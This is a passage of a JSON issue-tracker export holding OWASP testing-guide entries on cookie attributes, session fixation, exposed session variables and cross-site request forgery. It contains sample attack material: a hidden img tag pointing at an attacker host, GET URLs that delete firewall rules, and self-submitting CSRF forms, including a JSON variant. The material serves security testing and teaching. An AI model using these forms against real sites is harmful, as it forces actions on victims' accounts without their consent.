[\u0060SameSite\u0060](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#SameSite_cookies) attribute can be used to assert whether a cookie should be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-origin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent [cross-site request forgery](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery) attacks. This attribute can be configured in three different modes:\n\n* \u0060Strict\u0060\n* \u0060Lax\u0060\n* \u0060None\u0060\n\n##### Strict Value\n\nThe \u0060Strict\u0060 value is the most restrictive usage of \u0060SameSite\u0060, allowing the browser to send the cookie only to first-party context without top-level navigation. In other words, the data associated with the cookie will only be sent on requests matching the current site shown on the browser URL bar. The cookie will not be sent on requests generated by third-party sites. This value is especially recommended for actions performed at the same domain. However, it can have some limitations with some session management systems negatively affecting the user navigation experience. Since the browser would not send the cookie on any requests generated from a third-party domain or email, the user would be required to sign in again even if they already have an authenticated session.\n\n##### Lax Value\n\nThe \u0060Lax\u0060 value is less restrictive than \u0060Strict\u0060. The cookie will be sent if the URL equals the cookie\u2019s domain (first-party) even if the link is coming from a third-party domain. This value is considered by most browsers the default behavior since it provides a better user experience than the \u0060Strict\u0060 value. It doesn\u2019t trigger for assets, such as images, where cookies might not be needed to access them.\n\n##### None Value\n\nThe \u0060None\u0060 value specifies that the browser will send the cookie in all contexts, including cross-site requests (the normal behavior before the implementation of \u0060SameSite\u0060). If \u0060Samesite=None\u0060 is set, then the Secure attribute must be set, otherwise modern browsers will ignore the SameSite attribute, *e.g.* \u0060SameSite=None; Secure\u0060.\n\n### Cookie Prefixes\n\nBy design cookies do not have the capabilities to guarantee the integrity and confidentiality of the information stored in them. Those limitations make it impossible for a server to have confidence about how a given cookie\u2019s attributes were set at creation. In order to give the servers such features in a backwards-compatible way, the industry has introduced the concept of [\u0060Cookie Name Prefixes\u0060](https://tools.ietf.org/html/draft-ietf-httpbis-cookie-prefixes-00) to facilitate passing such details embedded as part of the cookie name.\n\n#### Host Prefix\n\nThe [\u0060__Host-\u0060](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Cookie_prefixes) prefix expects cookies to fulfill the following conditions:\n\n1. The cookie must be set with the [\u0060Secure\u0060 attribute](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes#secure-attribute).\n2. The cookie must be set from a URI considered secure by the user agent.\n3. Sent only to the host who set the cookie and MUST NOT include any [\u0060Domain\u0060 attribute](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes#domain-attribute).\n4. The cookie must be set with the [\u0060Path\u0060 attribute](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes#path-attribute) with a value of \u0060/\u0060 so it would be sent with every request to the host.\n\nFor this reason, the cookie \u0060Set-Cookie: __Host-SID=12345; Secure; Path=/\u0060 would be accepted while any of the following ones would always be rejected: \u0060Set-Cookie: __Host-SID=12345\u0060 \u0060Set-Cookie: __Host-SID=12345; Secure\u0060 \u0060Set-Cookie: __Host-SID=12345; Domain=site.example\u0060 \u0060Set-Cookie: __Host-SID=12345; Domain=site.example; Path=/\u0060 \u0060Set-Cookie: __Host-SID=12345; Secure; Domain=site.example; Path=/\u0060\n\n#### Secure Prefix\n\nThe [\u0060__Secure-\u0060](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Cookie_prefixes) prefix is less restrictive and can be introduced by adding the case-sensitive string \u0060__Secure-\u0060 to the cookie name. Any cookie that matches the prefix \u0060__Secure-\u0060 would be expected to fulfill the following conditions:\n\n1. The cookie must be set with the \u0060Secure\u0060 attribute.\n2. The cookie must be set from a URI considered secure by the user agent.\n\n### Strong Practices\n\nBased on the application needs, and how the cookie should function, the attributes and prefixes must be applied. The more the cookie is locked down, the better.\nPutting all this together, we can define the most secure cookie attribute configuration as: \u0060Set-Cookie: __Host-SID=\u003Csession token\u003E; path=/; Secure; HttpOnly; SameSite=Strict\u0060.\n\n## Tools\n\n### Intercepting Proxy\n\n* [Zed Attack Proxy (ZAP)](https://www.zaproxy.org/)\n* [Web Proxy Burp Suite](https://portswigger.net/)\n\n### Browser Plug-in\n\n* [Tamper Data for FF Quantum](https://addons.mozilla.org/en-US/firefox/addon/tamper-data-for-ff-quantum/)\n* [\u201CFireSheep\u201D for FireFox](https://github.com/codebutler/firesheep)\n* [\u201CEditThisCookie\u201D for Chrome](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en)\n* [\u201CCookiebro - Cookie Manager\u201D for FireFox](https://addons.mozilla.org/en-US/firefox/addon/cookiebro/)","Details":null,"Implication":null,"Recommendation":null,"References":"* [RFC 2965 - HTTP State Management Mechanism](https://tools.ietf.org/html/rfc2965)\n* [RFC 2616 \u2013 Hypertext Transfer Protocol \u2013 HTTP 1.1](https://tools.ietf.org/html/rfc2616)\n* [Same-Site Cookies - draft-ietf-httpbis-cookie-same-site-00](https://tools.ietf.org/html/draft-ietf-httpbis-cookie-same-site-00)\n* [The important \u201Cexpires\u201D attribute of Set-Cookie](https://seckb.yehg.net/2012/02/important-expires-attribute-of-set.html)\n* [HttpOnly Session ID in URL and Page Body](https://seckb.yehg.net/2012/06/httponly-session-id-in-url-and-page.html)\n* [Internet Explorer Cookie Internals (FAQ)](https://learn.microsoft.com/en-gb/archive/blogs/ieinternals/internet-explorer-cookie-internals-faq)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/25/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"06-Session Management Testing","Description":"06-Session Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"23212627-d01d-4ff1-a6cc-378480f3cd7a","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-SESS-03 Testing for Session Fixation","Severity":"High","FoundDate":"2024-06-25T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/03-Testing_for_Session_Fixation","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/03-Testing_for_Session_Fixation","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nSession fixation is enabled by the insecure practice of preserving the same value of the session cookies before and after authentication. This typically happens when session cookies are used to store state information even before login, e.g., to add items to a shopping cart before authenticating for payment.\nIn the generic exploit of session fixation vulnerabilities, an attacker can obtain a set of session cookies from the target site without first authenticating. The attacker can then force these cookies into the victim\u2019s browser using different techniques. If the victim later authenticates at the target site and the cookies are not refreshed upon login, the victim will be identified by the session cookies chosen by the attacker. The attacker is then able to impersonate the victim with these known cookies.\nThis issue can be fixed by refreshing the session cookies after the authentication process. Alternatively, the attack can be prevented by ensuring the integrity of session cookies. When considering network attackers, i.e., attackers who control the network used by the victim, use full [HSTS](https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security) or add the\u0060__Host-\u0060 / \u0060__Secure-\u0060 prefix to the cookie name.\nFull HSTS adoption occurs when a host activates HSTS for itself and all its sub-domains. This is described in a paper called *Testing for Integrity Flaws in Web Sessions* by Stefano Calzavara, Alvise Rabitti, Alessio Ragazzo, and Michele Bugliesi.","TestingInstructions":"## Test Objectives\n\n* Analyze the authentication mechanism and its flow.\n* Force cookies and assess the impact.\n\n## How to Test\n\nIn this section we give an explanation of the testing strategy that will be shown in the next section.\nThe first step is to make a request to the site to be tested (*e.g.* \u0060www.example.com\u0060). If the tester requests the following:\n\n\u0060\u0060\u0060\nGET\u00A0/ HTTP/1.1\nHost: www.example.com\n\u0060\u0060\u0060\n\nThey will obtain the following response:\n\n\u0060\u0060\u0060\nHTTP/1.1 200 OK\nDate: Wed, 14 Aug 2008 08:45:11 GMT\nServer: IBM_HTTP_Server\nSet-Cookie: JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1; Path=/; secure\nCache-Control: no-cache=\u0022set-cookie,set-cookie2\u0022\nExpires: Thu, 01 Dec 1994 16:00:00 GMT\nKeep-Alive: timeout=5, max=100\nConnection: Keep-Alive\nContent-Type: text/html;charset=Cp1254\nContent-Language: en-US\n\u0060\u0060\u0060\n\nThe application sets a new session identifier, \u0060JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1\u0060, for the client.\nNext, if the tester successfully authenticates to the application with the following POST to \u0060https://www.example.com/authentication.php\u0060:\n\n\u0060\u0060\u0060\nPOST /authentication.php HTTP/1.1\nHost: www.example.com\n[...]\nReferer: http://www.example.com\nCookie: JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1\nContent-Type: application/x-www-form-urlencoded\nContent-length: 57\n\nName=Meucci\u0026wpPassword=secret!\u0026wpLoginattempt=Log\u002Bin\n\u0060\u0060\u0060\n\nThe tester observes the following response from the server:\n\n\u0060\u0060\u0060\nHTTP/1.1 200 OK\nDate: Thu, 14 Aug 2008 14:52:58 GMT\nServer: Apache/2.2.2 (Fedora)\nX-Powered-By: PHP/5.1.6\nContent-language: en\nCache-Control: private, must-revalidate, max-age=0\nX-Content-Encoding: gzip\nContent-length: 4090\nConnection: close\nContent-Type: text/html; charset=UTF-8\n...\nHTML data\n...\n\u0060\u0060\u0060\n\nAs no new cookie has been issued upon a successful authentication, the tester knows that it is possible to perform session hijacking unless the integrity of the session cookie is ensured.\nThe tester can send a valid session identifier to a user (possibly using a social engineering trick), wait for them to authenticate, and subsequently verify that privileges have been assigned to this cookie.\n\n### Test with Forced Cookies\n\nThis testing strategy is targeted at network attackers, hence it only needs to be applied to sites without full HSTS adoption (sites with full HSTS adoption are secure, since all their cookies have integrity). We assume to have two testing accounts on the site under test, one to act as the victim and one to act as the attacker. We simulate a scenario where the attacker forces in the victim\u2019s browser all the cookies which are not freshly issued after login and do not have integrity. After the victim\u2019s login, the attacker presents the forced cookies to the site to access the victim\u2019s account: if they are enough to act on the victim\u2019s behalf, session fixation is possible.\nHere are the steps for executing this test:\n\n1. Reach the login page of the site.\n2. Save a snapshot of the cookie jar before logging in, excluding cookies which contain the \u0060__Host-\u0060 or \u0060__Secure-\u0060 prefix in their name.\n3. Login to the site as the victim and reach any page offering a secure function requiring authentication.\n4. Set the cookie jar to the snapshot taken at step 2.\n5. Trigger the secure function identified at step 3.\n6. Observe whether the operation at step 5 has been performed successfully. If so, the attack was successful.\n7. Clear the cookie jar, login as the attacker and reach the page at step 3.\n8. Write in the cookie jar, one by one, the cookies saved at step 2.\n9. Trigger again the secure function identified at step 3.\n10. Clear the cookie jar and login again as the victim.\n11. Observe whether the operation at step 9 has been performed successfully in the victim\u2019s account. If so, the attack was successful; otherwise, the site is secure against session fixation.\n\nWe recommend using two different machines or browsers for the victim and the attacker. This allows you to decrease the number of false positives if the web application does fingerprinting to verify access enabled from a given cookie. A shorter but less precise variant of the testing strategy only requires one testing account. It follows the same steps, but it halts at step 6.","Details":null,"Implication":null,"Recommendation":"Implement a session token renewal after a user successfully authenticates.\nThe application should always first invalidate the existing session ID before authenticating a user, and if the authentication is successful, provide another session ID.\n\n\u003Cbr\u003E\n","References":"* [Session Fixation](https://owasp.org/www-community/attacks/Session_fixation)\n* [ACROS Security](https://www.acrossecurity.com/papers/session_fixation.pdf)\n* [Chris Shiflett](http://shiflett.org/articles/session-fixation)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/25/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"06-Session Management Testing","Description":"06-Session Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"23212627-d01d-4ff1-a6cc-378480f3cd7a","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-SESS-04 Testing for Exposed Session Variables","Severity":"High","FoundDate":"2024-06-25T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/04-Testing_for_Exposed_Session_Variables","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/04-Testing_for_Exposed_Session_Variables","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nThe Session Tokens (Cookie, SessionID, Hidden Field), if exposed, will usually enable an attacker to impersonate a victim and access the application illegitimately. It is important that they are protected from eavesdropping at all times, particularly whilst in transit between the client browser and the application servers.\nThe information here relates to how transport security applies to the transfer of sensitive Session ID data rather than data in general, and may be stricter than the caching and transport policies applied to the data served by the site.\nUsing a personal proxy, it is possible to ascertain the following about each request and response:\n\n* Protocol used (e.g., HTTP vs. HTTPS)\n* HTTP Headers\n* Message Body (e.g., POST or page content)\n\nEach time Session ID data is passed between the client and the server, the protocol, cache, and privacy directives and body should be examined. Transport security here refers to Session IDs passed in GET or POST requests, message bodies, or other means over valid HTTP requests.","TestingInstructions":"## Test Objectives\n\n* Ensure that proper encryption is implemented.\n* Review the caching configuration.\n* Assess the channel and methods\u2019 security.\n\n## How to Test\n\n### Testing for Encryption \u0026 Reuse of Session Tokens Vulnerabilities\n\nProtection from eavesdropping is often provided by TLS encryption, but may incorporate other tunneling or encryption. It should be noted that encryption or cryptographic hashing of the Session ID should be considered separately from transport encryption, as it is the Session ID itself being protected, not the data that may be represented by it.\nIf the Session ID could be presented by an attacker to the application to gain access, then it must be protected in transit to mitigate that risk. It should therefore be ensured that encryption is both the default and enforced for any request or response where the Session ID is passed, regardless of the mechanism used (e.g., a hidden form field). Simple checks such as replacing \u0060https://\u0060 with \u0060http://\u0060 during interaction with the application should be performed, together with modification of form posts to determine if adequate segregation between the secure and non-secure sites is implemented.\nNote that if there is also an element to the site where the user is tracked with Session IDs but security is not present (e.g., noting which public documents a registered user downloads) it is essential that a different Session ID is used. The Session ID should therefore be monitored as the client switches from the secure to non-secure elements to ensure a different one is used.\n\n\u003E Every time the authentication is successful, the user should expect to receive:\n\u003E\n\u003E * A different session token\n\u003E * A token sent via encrypted channel every time they make an HTTP Request\n\n### Testing for Proxies \u0026 Caching Vulnerabilities\n\nProxies must also be considered when reviewing application security. In many cases, clients will access the application through corporate, ISP, or other proxies or protocol aware gateways (e.g., Firewalls). The HTTP protocol provides directives to control the behavior of downstream proxies, and the correct implementation of these directives should also be assessed.\nIn general, the Session ID should never be sent over unencrypted transport and should never be cached. The application should be examined to ensure that encrypted communications are both the default and enforced for any transfer of Session IDs. Furthermore, whenever the Session ID is passed, directives should be in place to prevent its caching by intermediate and even local caches.\nThe application should also be configured to secure data in caches over both HTTP/1.0 and HTTP/1.1 \u2013 RFC 2616 discusses the appropriate controls with reference to HTTP. HTTP/1.1 provides a number of cache control mechanisms. \u0060Cache-Control: no-cache\u0060 indicates that a proxy must not re-use any data. Whilst \u0060Cache-Control: Private\u0060 appears to be a suitable directive, this still allows a non-shared proxy to cache data. In the case of web-cafes or other shared systems, this presents a clear risk. Even with single-user workstations the cached Session ID may be exposed through a compromise of the file-system or where network stores are used. HTTP/1.0 caches do not recognise the \u0060Cache-Control: no-cache\u0060 directive.\n\n\u003E The \u0060Expires: 0\u0060 and \u0060Cache-Control: max-age=0\u0060 directives should be used to further ensure caches do not expose the data. Each request/response passing Session ID data should be examined to ensure appropriate cache directives are in use.\n\n### Testing for GET \u0026 POST Vulnerabilities\n\nIn general, GET requests should not be used, as the Session ID may be exposed in Proxy or Firewall logs. They are also far more easily manipulated than other types of transport, although it should be noted that almost any mechanism can be manipulated by the client with the right tools. Furthermore, [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) attacks are most easily exploited by sending a specially constructed link to the victim. This is far less likely if data is sent from the client as POSTs.\nAll server-side code receiving data from POST requests should be tested to ensure it does not accept the data if sent as a GET. For example, consider the following POST request (\u0060http://owaspapp.com/login.asp\u0060) generated by a log in page.\n\n\u0060\u0060\u0060\nPOST /login.asp HTTP/1.1\nHost: owaspapp.com\n[...]\nCookie: ASPSESSIONIDABCDEFG=ASKLJDLKJRELKHJG\nContent-Length: 51\n\nLogin=Username\u0026password=Password\u0026SessionID=12345678\n\u0060\u0060\u0060\n\nIf login.asp is badly implemented, it may be possible to log in using the following URL: \u0060http://owaspapp.com/login.asp?Login=Username\u0026password=Password\u0026SessionID=12345678\u0060\nPotentially insecure server-side scripts may be identified by checking each POST in this way.\n\n### Testing for Transport Vulnerabilities\n\nAll interaction between the Client and Application should be tested at least against the following criteria.\n\n* How are Session IDs transferred? e.g., GET, POST, Form Field (including hidden fields)\n* Are Session IDs always sent over encrypted transport by default?\n* Is it possible to manipulate the application to send Session IDs unencrypted? e.g., by changing HTTPS to HTTP?\n* What cache-control directives are applied to requests/responses passing Session IDs?\n* Are these directives always present? If not, where are the exceptions?\n* Are GET requests incorporating the Session ID used?\n* If POST is used, can it be interchanged with GET?","Details":null,"Implication":null,"Recommendation":null,"References":"* [RFCs 2109 and 2965 \u2013 HTTP State Management Mechanism - D. Kristol, L. Montulli](https://www.ietf.org/rfc/rfc2965.txt)\n* [RFC 2616 \u2013 Hypertext Transfer Protocol - HTTP/1.1](https://www.ietf.org/rfc/rfc2616.txt)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/25/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"06-Session Management Testing","Description":"06-Session Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"23212627-d01d-4ff1-a6cc-378480f3cd7a","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-SESS-05 Testing for Cross Site Request Forgery","Severity":"High","FoundDate":"2024-06-25T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nCross-Site Request Forgery ([CSRF](https://owasp.org/www-community/attacks/csrf)) is an attack that forces an end user to execute unintended actions on a web application in which they are currently authenticated. With a little social engineering help (like sending a link via email or chat), an attacker may force the users of a web application to execute actions of the attacker\u2019s choosing. A successful CSRF exploit can compromise end user data and operation when it targets a normal user. If the targeted end user is the administrator account, a CSRF attack can compromise the entire web application.\nCSRF relies on:\n\n1. Web browser behavior regarding the handling of session-related information such as cookies and HTTP authentication information.\n2. An attacker\u2019s knowledge of valid web application URLs, requests, or functionality.\n3. Application session management relying only on information known by the browser.\n4. Existence of HTML tags whose presence cause immediate access to an HTTP[S] resource; for example the image tag \u0060img\u0060.\n\nPoints 1, 2, and 3 are essential for the vulnerability to be present, while point 4 facilitates the actual exploitation, but is not strictly required.\n\n1. Browsers automatically send information used to identify a user session. Suppose *site* is a site hosting a web application, and the user *victim* has just authenticated to *site*. In response, *site* sends *victim* a cookie that identifies requests sent by *victim* as belonging to *victim\u2019s* authenticated session. Once the browser receives the cookie set by *site*, it will automatically send it along with any further requests directed to *site*.\n2. If the application does not make use of session-related information in URLs, then the application URLs, their parameters, and legitimate values may be identified. This may be accomplished by code analysis or by accessing the application and taking note of forms and URLs embedded in the HTML or JavaScript.\n3. \u201CKnown by the browser\u201D refers to information such as cookies or HTTP-based authentication information (such as Basic Authentication and not form-based authentication), that are stored by the browser and subsequently present at each request directed towards an application area requesting that authentication. The vulnerabilities discussed next apply to applications that rely entirely on this kind of information to identify a user session.\n\nFor simplicity\u2019s sake, consider GET-accessible URLs (though the discussion applies as well to POST requests). If *victim* has already authenticated themselves, submitting another request causes the cookie to be automatically sent with it. The figure below illustrates the user accessing an application on \u0060www.example.com\u0060.\n![Session Riding](Image Not Found)\n*Figure 4.6.5-1: Session Riding*\nThe GET request could be sent by the user in several different ways:\n\n* Using the web application\n* Typing the URL directly in the browser\n* Following an external link that points to the URL\n\nThese invocations are indistinguishable by the application. In particular, the third may be quite dangerous. There are a number of techniques and vulnerabilities that can disguise the real properties of a link. The link can be embedded in an email message, appear in a malicious site to which the user is lured, or appear in content hosted by a third-party (such as another site or HTML email) and point to a resource of the application. If the user clicks on the link, since they are already authenticated by the web application on *site*, the browser will issue a GET request to the web application, accompanied by authentication information (the session ID cookie). This results in a valid operation being performed on the web application that the user does not expect; for example, a funds transfer on a web banking application.\nBy using a tag such as \u0060img\u0060, as specified in point 4 above, it is not even necessary that the user follows a particular link. Suppose the attacker sends the user an email inducing them to visit a URL referring to a page containing the following (oversimplified) HTML.\n\n\u0060\u0060\u0060\n\u003Chtml\u003E\n    \u003Cbody\u003E\n...\n\u003Cimg src=\u0022https://www.company.example/action\u0022 width=\u00220\u0022 height=\u00220\u0022\u003E\n...\n    \u003C/body\u003E\n\u003C/html\u003E\n\u0060\u0060\u0060\n\nWhen the browser displays this page, it will try to display the specified zero-dimension (thus, invisible) image from \u0060https://www.company.example\u0060 as well. This results in a request being automatically sent to the web application hosted on *site*. It is not important that the image URL does not refer to a proper image, as its presence will trigger the request \u0060action\u0060 specified in the \u0060src\u0060 field anyway. This happens provided that image download is not disabled in the browser. Most browsers do not have image downloads disabled since that would cripple most web applications beyond usability.\nThe problem here is a consequence of:\n\n* HTML tags on the page resulting in automatic HTTP request execution (\u0060img\u0060 being one of those).\n* The browser having no way to tell that the resource referenced by \u0060img\u0060 is not a legitimate image.\n* Image loading that happens regardless of the location of the alleged image source, i.e., the form and the image itself need not be located on the same host or even the same domain.\n\nThe fact that HTML content unrelated to the web application may refer to components in the application, and the fact that the browser automatically composes a valid request towards the application, allows this kind of attack. There is no way to prohibit this behavior unless it is made impossible for the attacker to interact with application functionality.\nIn integrated mail/browser environments, simply displaying an email message containing the image reference would result in the execution of the request to the web application with the associated browser cookie. Email messages may reference seemingly valid image URLs such as:\n\n\u0060\u0060\u0060\n\u003Cimg src=\u0022https://[attacker]/picture.gif\u0022 width=\u00220\u0022 height=\u00220\u0022\u003E\n\u0060\u0060\u0060\n\nIn this example, \u0060[attacker]\u0060 is a site controlled by the attacker. By utilizing a redirect mechanism, the malicious site may use \u0060http://[attacker]/picture.gif\u0060\u00A0to direct the victim to\u00A0\u0060http://[thirdparty]/action\u0060 and trigger the \u0060action\u0060.\nCookies are not the only example involved in this kind of vulnerability. Web applications whose session information is entirely supplied by the browser are vulnerable too. This includes applications relying on HTTP authentication mechanisms alone, since the authentication information is known by the browser and is sent automatically upon each request. This does not include form-based authentication, which occurs just once and generates some form of session-related information, usually a cookie.\nLet\u2019s suppose that the victim is logged on to a firewall web management console. To log in, a user has to authenticate themselves and session information is stored in a cookie.\nLet\u2019s suppose the firewall web management console has a function that allows an authenticated user to delete a rule specified by its numerical ID, or all the rules in the configuration if the user specifies \u0060*\u0060 (a dangerous feature in reality, but one that makes for a more interesting example). The delete page is shown next. Let\u2019s suppose that the form \u2013 for the sake of simplicity \u2013 issues a GET request. To delete rule number one:\n\n\u0060\u0060\u0060\nhttps://[target]/fwmgt/delete?rule=1\n\u0060\u0060\u0060\n\nTo delete all rules:\n\n\u0060\u0060\u0060\nhttps://[target]/fwmgt/delete?rule=*\n\u0060\u0060\u0060\n\nThis example is intentionally naive, but shows in a simplified way the dangers of CSRF.\n![Session Riding Firewall Management](Image Not Found)\n*Figure 4.6.5-2: Session Riding Firewall Management*\nUsing the form pictured in the figure above, entering the value \u0060*\u0060 and clicking the Delete button will submit the following GET request:\n\n\u0060\u0060\u0060\nhttps://www.company.example/fwmgt/delete?rule=*\n\u0060\u0060\u0060\n\nThis would delete all firewall rules.\n![Session Riding Firewall Management 2](Image Not Found)\n*Figure 4.6.5-3: Session Riding Firewall Management 2*\nThe user might also have accomplished the same results by manually submitting the URL:\n\n\u0060\u0060\u0060\nhttps://[target]/fwmgt/delete?rule=*\n\u0060\u0060\u0060\n\nOr by following a link pointing, directly or via a redirection, to the above URL. Or, again, by accessing an HTML page with an embedded \u0060img\u0060 tag pointing to the same URL.\nIn all of these cases, if the user is currently logged in to the firewall management application, the request will succeed and will modify the configuration of the firewall. One can imagine attacks targeting sensitive applications and making automatic auction bids, money transfers, orders, changing the configuration of critical software components, etc.\nAn interesting thing is that these vulnerabilities may be exercised behind a firewall; i.e. it is sufficient that the link being attacked be reachable by the victim and not directly by the attacker. In particular, it can be any intranet web server; for example, in the firewall management scenario mentioned before, which is unlikely to be exposed to the internet.\nSelf-vulnerable applications, i.e. applications that are used both as attack vector and target (such as web mail applications), make things worse. Since users are logged in when they read their email messages, a vulnerable application of this type can allow attackers to perform actions such as deleting messages or sending messages that appear to originate from the victim.","TestingInstructions":"## Test Objectives\n\n* Determine whether it is possible to initiate requests on a user\u2019s behalf that are not initiated by the user.\n\n## How to Test\n\nAudit the application to ascertain if its session management is vulnerable. If session management relies only on client-side values (information available to the browser), then the application is vulnerable. \u201CClient-side values\u201D refers to cookies and HTTP authentication credentials (Basic Authentication and other forms of HTTP authentication; not form-based authentication, which is an application-level authentication).\nResources accessible via HTTP GET requests are easily vulnerable, though POST requests can be automated via JavaScript and are vulnerable as well; therefore, the use of POST alone is not enough to correct the occurrence of CSRF vulnerabilities.\nIn case of POST, the following sample can be used.\n\n1. Create an HTML page similar to that shown below\n2. Host the HTML on a malicious or third-party site\n3. Send the link for the page to the victim(s) and induce them to click it.\n\n\u0060\u0060\u0060\n\u003Chtml\u003E\n\u003Cbody onload=\u0027document.CSRF.submit()\u0027\u003E\n\n\u003Cform action=\u0027http://targetWebsite/Authenticate.jsp\u0027 method=\u0027POST\u0027 name=\u0027CSRF\u0027\u003E\n    \u003Cinput type=\u0027hidden\u0027 name=\u0027name\u0027 value=\u0027Hacked\u0027\u003E\n    \u003Cinput type=\u0027hidden\u0027 name=\u0027password\u0027 value=\u0027Hacked\u0027\u003E\n\u003C/form\u003E\n\n\u003C/body\u003E\n\u003C/html\u003E\n\u0060\u0060\u0060\n\nIn case of web applications in which developers are utilizing JSON for browser to server communication, a problem may arise with the fact that there are no query parameters with the JSON format, which are a must with self-submitting forms. To bypass this case, we can use a self-submitting form with JSON payloads including hidden input to exploit CSRF. We\u2019ll have to change the encoding type (\u0060enctype\u0060) to \u0060text/plain\u0060 to ensure the payload is delivered as-is. The exploit code will look like the following:\n\n\u0060\u0060\u0060\n\u003Chtml\u003E\n \u003Cbody\u003E\n  \u003Cscript\u003Ehistory.pushState(\u0027\u0027, \u0027\u0027, \u0027/\u0027)\u003C/script\u003E\n   \u003Cform action=\u0027http://victimsite.com\u0027 method=\u0027POST\u0027 enctype=\u0027text/plain\u0027\u003E\n     \u003Cinput type=\u0027hidden\u0027 name=\u0027{\u0022name\u0022:\u0022hacked\u0022,\u0022password\u0022:\u0022hacked\u0022,\u0022padding\u0022:\u0022\u0027value=\u0027something\u0022}\u0027 /\u003E\n     \u003Cinput type=\u0027submit\u0027 value=\u0027Submit request\u0027 /\u003E\n   \u003C/form\u003E\n \u003C/body\u003E\n\u003C/html\u003E\n\u0060\u0060\u0060\n\nThe POST request will be as follow:\n\n\u0060\u0060\u0060\nPOST / HTTP/1.1\nHost: victimsite.com\nContent-Type: text/plain\n\n{\u0022name\u0022:\u0022hacked\u0022,\u0022password\u0022:\u0022hacked\u0022,\u0022padding\u0022:\u0022=something\u0022}\n\u0060\u0060\u0060\n\nWhen this data is sent as a POST request, the server will happily accept the name and password fields and ignore the one with the name padding as it does not need it.\n\n## Remediation\n\n* See the [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) for prevention 